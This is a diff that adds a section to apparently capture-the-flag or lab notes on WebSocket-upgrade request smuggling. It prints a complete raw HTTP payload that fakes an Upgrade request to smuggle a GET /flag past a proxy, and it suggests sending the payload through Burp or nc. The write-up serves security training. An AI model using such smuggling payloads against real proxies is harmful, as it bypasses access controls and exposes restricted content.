@@ -59,3 +59,23 @@ Host: IP_ADDRESS:PORT
 ## TIP: DON'T FORGET TO PRESS ENTER TWICE (ADD 2 NEWLINES UNDER THE PAYLOAD) AFTER THE SMUGGLED HTTP REQUEST TO MAKE THIS ATTACK WORK
 
 #### 7) Send the request to access the restricted content
+
+## What if the app doesn't speak WebSocket?
+
+### Note that some proxies will not even require the existence of a WebSocket endpoint for this technique to work. All we need is to fool the proxy into believing we are establishing a connection to a WebSocket, even if this isn't true. Look at what happens if you try to send the following payload (be sure to add two newlines after the payload in Burp):
+
+GET / HTTP/1.1
+Host: 10.10.55.67:8001
+Sec-WebSocket-Version: 13
+Upgrade: WebSocket
+Connection: Upgrade
+Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
+
+GET /flag HTTP/1.1
+Host: 10.10.55.67:8001
+
+
+### This payload should still work, even though the first request is directed to /, which is not a WebSocket-enabled endpoint. The proxy simply doesn't check the response from the upgrade, so you can use any payload that looks close enough to a WebSocket upgrade.
+
+## NOTE: This payload will randomly fail when using Burp. You can either retry the payload a couple of times until it works, or deliver it by pasting it into a terminal running nc 10.10.55.67 8001, where it will work every time (don't forget the trailing newlines).
+
